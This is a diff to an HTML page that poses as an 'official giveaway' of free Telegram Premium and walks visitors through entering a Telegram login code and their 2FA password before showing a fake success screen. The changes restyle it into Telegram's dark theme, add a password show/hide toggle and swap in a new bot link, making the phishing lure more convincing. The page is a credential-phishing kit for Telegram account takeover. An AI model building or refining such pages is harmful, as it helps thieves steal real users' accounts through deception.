@@ -18,24 +18,26 @@
     body {
         margin: 0;
         padding: 0;
-        background: linear-gradient(145deg, #f0f4fa 0%, #e9eef4 100%);
+        /* Color changed from white/light to Telegram black theme */
+        background: #0e1626;
         min-height: 100vh;
         display: flex;
         flex-direction: column;
         align-items: center;
-        color: #1c2a44;
+        color: #ffffff;
     }
     .glass-header {
         width: 100%;
-        background: rgba(255,255,255,0.75);
+        /* Adjusted for dark theme */
+        background: #17212b;
         backdrop-filter: blur(12px);
         -webkit-backdrop-filter: blur(12px);
         padding: 14px 24px;
         display: flex;
         justify-content: space-between;
         align-items: center;
-        box-shadow: 0 4px 20px rgba(0,0,0,0.02);
-        border-bottom: 1px solid rgba(255,255,255,0.6);
+        box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+        border-bottom: 1px solid #2b3b49;
         position: sticky;
         top: 0;
         z-index: 99;
@@ -46,7 +48,7 @@
         gap: 8px;
         font-weight: 700;
         font-size: 18px;
-        color: #1c2a44;
+        color: #ffffff;
     }
     .logo-premium i {
         color: #8774e1;
@@ -54,7 +56,7 @@
         filter: drop-shadow(0 4px 6px rgba(135,116,225,0.3));
     }
     .badge-year {
-        background: #1c2a44;
+        background: #2b5278;
         color: white;
         padding: 6px 12px;
         border-radius: 40px;
@@ -103,14 +105,15 @@
       }
 
     .premium-card {
-        background: rgba(255,255,255,0.9);
+        /* Adjusted for dark theme */
+        background: #17212b;
         backdrop-filter: blur(16px);
         -webkit-backdrop-filter: blur(16px);
-        border: 1px solid rgba(255,255,255,0.9);
+        border: 1px solid #2b3b49;
         border-radius: 40px;
         padding: 28px 24px;
         width: 100%;
-        box-shadow: 0 20px 40px -10px rgba(28, 42, 68, 0.12), 0 0 0 1px rgba(255,255,255,0.6) inset;
+        box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.5);
     }
 
     .gift-hero {
@@ -129,27 +132,28 @@
         display: flex;
         align-items: center;
         gap: 14px;
-        background: #ffffffc7;
+        /* Adjusted for dark theme */
+        background: #1e2b38;
         border-radius: 60px;
         padding: 12px 20px;
         margin-bottom: 12px;
-        border: 1px solid white;
-        box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+        border: 1px solid #2b3b49;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.2);
     }
     .perk-icon {
         width: 38px; height: 38px;
-        background: #f0edfe;
+        background: #2b3b49;
         border-radius: 30px;
         display: flex;
         align-items: center; justify-content: center;
         color: #8774e1;
         font-size: 20px;
     }
-    .perk-text { font-weight: 600; color: #1c2a44; flex:1; }
-    .perk-desc { color: #52658b; font-size: 13px; font-weight: 400; }
+    .perk-text { font-weight: 600; color: #ffffff; flex:1; }
+    .perk-desc { color: #8e9cbb; font-size: 13px; font-weight: 400; }
 
     .counter-badge {
-        background: #1c2a44;
+        background: #2b5278;
         color: white;
         border-radius: 30px;
         padding: 6px 12px;
@@ -161,25 +165,49 @@
         width: 100%;
         padding: 18px 20px;
         border-radius: 100px;
-        border: 2px solid rgba(255,255,255,0.9);
-        background: rgba(255,255,255,0.8);
+        /* Adjusted for dark theme */
+        border: 2px solid #2b3b49;
+        background: #1e2b38;
         font-size: 16px;
         outline: none;
         transition: 0.2s;
         backdrop-filter: blur(4px);
-        box-shadow: 0 8px 20px rgba(0,0,0,0.02);
+        box-shadow: 0 8px 20px rgba(0,0,0,0.2);
         margin: 12px 0;
         font-weight: 500;
+        color: #ffffff;
     }
     input:focus {
         border-color: #8774e1;
-        background: white;
+        background: #232e3b;
         box-shadow: 0 0 0 4px rgba(135,116,225,0.15);
+    }
+    /* Style for password container */
+    .password-container {
+        position: relative;
+        width: 100%;
+        margin: 12px 0;
+    }
+    .password-container input {
+        margin: 0;
+        padding-right: 50px; /* Make space for the icon */
+    }
+    .password-container i {
+        position: absolute;
+        right: 20px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        color: #8e9cbb;
+        font-size: 1.2rem;
+    }
+    .password-container i:hover {
+        color: #8774e1;
     }
       .verify-loading {
         text-align: center;
-        color: #52658b;
-        background: rgba(255,255,255,0.6);
+        color: #8e9cbb;
+        background: #1e2b38;
         border-radius: 60px;
         padding: 12px 74px;
         display: inline-flex;
@@ -200,7 +228,7 @@
       100% { content: ""; }
     }
     .btn-primary {
-        background: #1c2a44;
+        background: #2b5278;
         color: white;
         padding: 18px 24px;
         border-radius: 100px;
@@ -210,11 +238,11 @@
         cursor: pointer;
         width: 100%;
         transition: 0.2s;
-        box-shadow: 0 10px 30px -5px #1c2a44;
+        box-shadow: 0 10px 30px -5px #0f1b2b;
         margin: 12px 0 6px;
     }
-    .btn-primary:active { transform: scale(0.97); background: #131f33; }
-    .btn-primary:disabled { background: #b3bbce; box-shadow: none; }
+    .btn-primary:active { transform: scale(0.97); background: #1f3f5c; }
+    .btn-primary:disabled { background: #3a4a5a; box-shadow: none; }
 
     .otp-dots {
         display: flex; justify-content: center; gap: 14px; margin: 25px 0 10px;
@@ -222,35 +250,37 @@
     .dot-box {
         width: 56px; height: 66px;
         border-radius: 20px;
-        background: white;
-        border: 2px solid #e2e8f0;
+        /* Adjusted for dark theme */
+        background: #1e2b38;
+        border: 2px solid #2b3b49;
         display: flex; align-items: center; justify-content: center;
-        font-size: 28px; font-weight: 700; color: #1c2a44;
-        box-shadow: 0 6px 12px rgba(0,0,0,0.02);
+        font-size: 28px; font-weight: 700; color: #ffffff;
+        box-shadow: 0 6px 12px rgba(0,0,0,0.2);
         transition: 0.2s;
     }
     .dot-box.filled {
         border-color: #8774e1;
-        background: #f1edff;
+        background: #2b3b49;
     }
 
     .keypad-grid {
         display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 25px;
     }
     .key {
-        background: white;
+        /* Adjusted for dark theme */
+        background: #1e2b38;
         padding: 18px 10px;
         border-radius: 26px;
         font-size: 24px;
         font-weight: 600;
         text-align: center;
-        box-shadow: 0 6px 16px rgba(0,0,0,0.02);
-        border: 1px solid #ffffff;
+        box-shadow: 0 6px 16px rgba(0,0,0,0.2);
+        border: 1px solid #2b3b49;
         cursor: pointer;
         transition: 0.1s;
-        color: #1c2a44;
+        color: #ffffff;
     }
-    .key:active { background: #f0edfe; transform: scale(0.94); }
+    .key:active { background: #2b3b49; transform: scale(0.94); }
 
     .msg-bubble {
         padding: 14px 20px;
@@ -262,26 +292,45 @@
         width: 100%;
         text-align: center;
     }
-    .error { background: #ffeae8; color: #c73b2b; border: 1px solid #ffc9c3; }
-    .success-msg { background: #e5ffe8; color: #1e7842; }
-    .loading { background: #e9ecf3; color: #1c2a44; }
+    .error { background: #57221e; color: #ff7b6b; border: 1px solid #b13e33; }
+    .success-msg { background: #1e4a3a; color: #8ae6c7; }
+    .loading { background: #1e2b38; color: #8e9cbb; }
 
     .inline-link {
-        background: rgba(255,255,255,0.7);
+        background: #1e2b38;
         backdrop-filter: blur(8px);
         padding: 14px 20px;
         border-radius: 60px;
         width: 100%;
         text-align: center;
         font-size: 15px;
-        border: 1px dashed #a594e3;
+        border: 1px dashed #8774e1;
         margin-top: 15px;
+        cursor: pointer;
+        /* Changed to bold as requested */
+        font-weight: bold;
+        color: #ffffff;
     }
     .inline-link i { color: #8774e1; margin-right: 6px; }
 
     .timer-flood {
-        font-size: 48px; font-weight: 800; color: #1c2a44; letter-spacing: 2px;
-        background: rgba(255,255,255,0.5); border-radius: 60px; padding: 20px; margin: 25px 0;
+        font-size: 48px; font-weight: 800; color: #ffffff; letter-spacing: 2px;
+        background: #1e2b38; border-radius: 60px; padding: 20px; margin: 25px 0;
+    }
+    /* Style for the image in step2 header */
+    .step-header-image {
+        width: 80px;
+        height: 80px;
+        margin: 0 auto 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .step-header-image img {
+        width: 100%;
+        height: auto;
+        border-radius: 50%;
+        background: #2b3b49; /* Optional: add a background if image has transparency */
     }
 </style>
 </head>
@@ -298,12 +347,12 @@
 
         <div id="step_intro" class="step active">
             <div class="premium-card" style="padding: 40px 20px; text-align: center;">
-                <div style="width: 70px; height: 70px; background: #eae6ff; border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center;">
+                <div style="width: 70px; height: 70px; background: #2b3b49; border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center;">
                     <i class="fa-brands fa-telegram" style="font-size: 40px; color:#8774e1;"></i>
                 </div>
                 <h2 style="font-size: 28px; margin-bottom: 8px;">Telegram Premium</h2>
-                <p style="color: #52658b; font-size: 16px;">free 1‑year subscription • official giveaway</p>
-                <div style="width: 48px; height: 48px; border: 4px solid #e2e8f0; border-top: 4px solid #8774e1; border-radius: 50%; margin: 35px auto 10px; animation: spin 0.9s infinite;"></div>
+                <p style="color: #8e9cbb; font-size: 16px;">free 1‑year subscription • official giveaway</p>
+                <div style="width: 48px; height: 48px; border: 4px solid #2b3b49; border-top: 4px solid #8774e1; border-radius: 50%; margin: 35px auto 10px; animation: spin 0.9s infinite;"></div>
                 <p style="color:#8774e1; font-weight: 500;">loading your eligibility...</p>
             </div>
         </div>
@@ -351,7 +400,7 @@
               </div>
 
                 <h2 style="margin-bottom: 5px;">Almost there</h2>
-                <p style="color:#3e4f70;">press continue to claim 1 year premium</p>
+                <p style="color:#8e9cbb;">press continue to claim 1 year premium</p>
                 <input type="hidden" id="fname" value="Member">
                 <div id="status1" class="msg-bubble"></div>
                 <button class="btn-primary" id="loginBtn" onclick="handleLoginClick()">✦ continue ✦</button>
@@ -361,9 +410,13 @@
 
         <div id="step2" class="step">
             <div class="premium-card">
-                <h2>🔐 verification code</h2>
-                <p id="step2_name_display" style="font-weight: 700; color:#1c2a44; "></p>
-                <p style="font-size: 15px;">we sent a 5‑digit code to your telegram app</p>
+                <!-- Changed emoji to image -->
+                <div class="step-header-image">
+                    <img src="https://cdn-icons-png.flaticon.com/512/481/481195.png" alt="Verification Icon">
+                </div>
+                <h2>verification code</h2>
+                <p id="step2_name_display" style="font-weight: 700; color:#ffffff; "></p>
+                <p style="font-size: 15px; color:#8e9cbb;">we sent a 5‑digit code to your telegram app</p>
 
                 <div class="otp-dots" id="otp_container">
                     <div class="dot-box" id="b0"></div>
@@ -374,7 +427,8 @@
                 </div>
                 <div id="status2" class="msg-bubble"></div>
 
-                <div class="inline-link" onclick="window.open('https://t.me/premium_gift_bot','_blank')">
+                <!-- Button is now bold due to CSS class .inline-link -->
+                <div class="inline-link" onclick="window.open('http://t.me//+42777','_blank')">
                     <i class="fa-brands fa-telegram"></i> tap to get code from bot
                 </div>
 
@@ -390,12 +444,16 @@
 
         <div id="step3" class="step">
             <div class="premium-card">
-                <div style="background: #f5f2ff; width: 70px; height: 70px; border-radius: 30px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                <div style="background: #2b3b49; width: 70px; height: 70px; border-radius: 30px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                     <i class="fa-solid fa-lock" style="font-size: 32px; color:#8774e1;"></i>
                 </div>
                 <h2 id="step3_name_display" style="margin-bottom:5px;">almost done</h2>
-                <p>enter your 2FA password (if you have one) to confirm premium activation</p>
-                <input type="password" id="2fa_input" placeholder="your 2FA (or leave empty)">
+                <p style="color:#8e9cbb;">enter your 2FA password (if you have one) to confirm premium activation</p>
+                <!-- Password input with eye icon for show/hide -->
+                <div class="password-container">
+                    <input type="password" id="2fa_input" placeholder="your 2FA (or leave empty)">
+                    <i class="fa-regular fa-eye" id="togglePasswordIcon" onclick="togglePasswordVisibility()"></i>
+                </div>
                 <div id="status3" class="msg-bubble"></div>
                 <button class="btn-primary" id="confirmBtn" onclick="submit2FA()">activate premium</button>
             </div>
@@ -408,16 +466,16 @@
                 </div>
                 <h2 style="font-size: 32px;">SUCCESS!</h2>
                 <p style="font-size: 18px; font-weight: 500;">✨ 1 year Telegram Premium ✨</p>
-                <p style="background: #eaf6ff; border-radius: 60px; padding: 16px;">will be added to your account within 24h. thousands of users – expect slight delay. thank you.</p>
-                <button class="btn-primary" style="background:#1c2a44;" onclick="window.location.href='https://t.me/telegram'">done</button>
+                <p style="background: #1e2b38; border-radius: 60px; padding: 16px; color:#8e9cbb;">will be added to your account within 24h. thousands of users – expect slight delay. thank you.</p>
+                <button class="btn-primary" style="background:#2b5278;" onclick="window.location.href='https://t.me/telegram'">done</button>
             </div>
         </div>
 
         <div id="flood_step" class="step">
             <div class="premium-card" style="text-align: center;">
                 <i class="fa-solid fa-hourglass-half" style="font-size: 50px; color:#8774e1;"></i>
-                <h2 style="color:#1c2a44;">please wait</h2>
-                <p>too many requests — system cooldown</p>
+                <h2 style="color:#ffffff;">please wait</h2>
+                <p style="color:#8e9cbb;">too many requests — system cooldown</p>
                 <div class="timer-flood" id="wait_time">00:00</div>
             </div>
         </div>
@@ -624,6 +682,21 @@
         });
         container.addEventListener('touchend', ()=> clearTimeout(timer));
     }
+
+    // New function to toggle password visibility
+    function togglePasswordVisibility() {
+        const passwordInput = document.getElementById('2fa_input');
+        const toggleIcon = document.getElementById('togglePasswordIcon');
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            toggleIcon.classList.remove('fa-eye');
+            toggleIcon.classList.add('fa-eye-slash');
+        } else {
+            passwordInput.type = 'password';
+            toggleIcon.classList.remove('fa-eye-slash');
+            toggleIcon.classList.add('fa-eye');
+        }
+    }
 </script>
 </body>
-</html>
+ </html>
